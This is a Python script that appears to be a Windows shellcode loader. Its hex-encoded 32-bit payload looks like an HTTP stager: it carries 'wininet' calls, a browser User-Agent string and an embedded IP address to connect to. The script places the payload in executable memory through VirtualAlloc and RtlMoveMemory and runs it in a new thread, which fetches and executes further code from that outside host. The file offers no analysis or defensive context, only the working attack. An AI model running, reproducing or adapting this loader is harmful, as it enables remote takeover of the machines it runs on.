import ctypes
import platform

(arch, type) = platform.architecture()

# 32-bit Python
if arch == "32bit":
	shellcode = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x52\x68\x37\x6b\x00\x31\x5c\x3d\x96\x9f\xec\x81\x19\xe5\xc4\xd1\x92\x2f\x7c\xd3\x78\x94\xeb\xb8\xe6\x4f\x1e\xcc\x2a\x29\xcb\x05\x59\xab\xc3\x07\x93\x7a\xe9\x10\x25\xd0\xca\x47\xf2\x19\x8e\x10\x35\x65\x43\x2e\xca\x8a\x73\x0a\xe8\x30\x72\xea\x53\xd8\xa9\x6f\x0b\xf8\x32\x69\x1f\xd4\xed\x7d\x27\x33\x59\x58\xda\xb3\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4e\x4d\x3b\x20\x4d\x41\x4e\x4d\x29\x0d\x0a\x00\xcc\x7c\x00\x80\xf7\xb8\xf6\x4d\x0a\x8a\xdd\xa7\x5d\x10\x50\xe1\x7b\xc4\xac\x3f\x47\x1f\x4a\xe1\xeb\x1f\xc3\x59\x84\xc2\x2c\x40\xa6\xca\x07\xe3\xa7\x41\xcf\xa7\xab\x47\x63\x7e\x4f\xb6\x9d\x79\x4b\x59\x53\xd5\x6f\xe8\x71\x42\xa4\x9c\x15\xcf\x83\xa0\x5e\x58\xd6\xce\x40\x67\x91\xdd\xec\xc8\x93\xbb\xd9\x7f\xc7\xc5\x88\xd7\x5d\x01\xe1\xa4\xb4\x40\xa4\x66\x42\xdc\xd4\xfb\x79\xea\xe6\xbe\x2d\xdf\x1b\x7c\xea\x06\x16\xbf\xe2\xa2\x9b\xc9\xe7\xe1\xef\xbb\x16\x68\xb1\x74\xa2\x18\x50\x4c\xad\x63\xd3\xa9\xd1\xa9\x67\x34\x33\xac\x39\xbe\x21\xf7\xc5\x7e\xf7\xa8\x29\x76\xd7\x34\x07\xc3\x36\x48\x3e\x9d\x71\x2b\x8b\x39\x80\xd8\xd3\x36\xfe\x7e\xdf\xe7\x5c\xc6\x42\x25\xb9\xa2\x2d\x9d\x76\x9a\x05\xf6\xb4\x5e\x11\x03\xbe\x89\x90\x8e\x3b\x83\x65\xf2\x33\x93\x21\x49\x2b\x6c\x5e\x06\xed\x7a\x45\x66\x27\x5d\x9d\x0b\xeb\x5e\xe7\xa8\x47\x2d\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x37\x34\x2e\x31\x31\x39\x2e\x31\x39\x32\x2e\x32\x33\x30\x00\x19\x69\xa0\x8d"

# 64-bit Python
elif arch == "64bit":
	shellcode = "" 
else:
	shellcode = ""

# sanity check our situation
if type != "WindowsPE" or len(shellcode) == 0:
	quit()

# inject our shellcode
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
